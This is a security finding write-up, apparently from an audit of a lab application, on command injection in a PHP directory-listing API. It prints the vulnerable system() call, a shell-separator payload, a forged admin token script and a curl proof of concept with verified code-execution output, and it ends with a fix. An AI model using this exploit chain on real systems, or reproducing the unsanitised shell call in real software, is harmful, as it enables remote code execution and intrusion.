# 17 — Command injection in the uplist API

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** Critical
- **Difficulty:** Medium

## Where

`web/api/v1/uplist/index.php:24,26` — `POST /api/v1/uplist/`
(Bearer admin token required):

```php
$path = str_rot13(isset($_POST['path']) ? $_POST['path'] : '');
ob_start();
system('ls ' . $path);
$out = ob_get_clean();
```

## How it works (root cause)

The `path` parameter is rot13-decoded and then concatenated directly into a
shell command string passed to `system()`. Shell metacharacters in the
decoded value break out of the `ls` argument and run arbitrary commands.
(The rot13 is a pointless obfuscation — it is trivially reversible and does
not sanitise anything.)

## Exploitation steps

1. Obtain a (forged) admin Bearer token — see 18.

2. Inject a command. The decoded `$path` must contain a shell separator.
   For example, to run `id`, make the decoded value:

   ```
   ; id > /tmp/osede_uplist_pwned; #
   ```

   and POST its rot13:

   ```bash
   TOKEN=$(python3 - <<'EOF'
import base64, json
print(base64.b64encode(json.dumps({"user":"admin","admin":1,"iat":0,"exp":9999999999}).encode()).decode() + ".AAAA")
EOF
)
ENC=$(python3 -c "import sys; print(__import__('codecs').encode(sys.argv[1],'rot13'))" '; id > /tmp/osede_uplist_pwned; #')
curl -s -H "Authorization: Bearer $TOKEN" --data-urlencode "path=$ENC" \
     http://localhost:8080/api/v1/uplist/
   ```

## Working PoC (verified)

After the request, `/tmp/osede_uplist_pwned` exists:

```
uid=1000(user) gid=1000(user) groups=1000(user)
```

— RCE as the PHP-FPM user.

## Expected result / verification

- A file created by the injected command appears on disk.
- The endpoint returns the (truncated) `ls` output as usual, hiding the
  injection.

## Attack chain

```
forged admin token (18)
  → /api/v1/uplist command injection
  → arbitrary shell command → RCE
```

## Notes

- The endpoint is meant to list a directory; the `system()` call is the
  root cause. A safe fix is `scandir()` (no shell) or strict allow-list
  validation of the path.
- rot13 adds no security: the attacker controls both encoding sides.
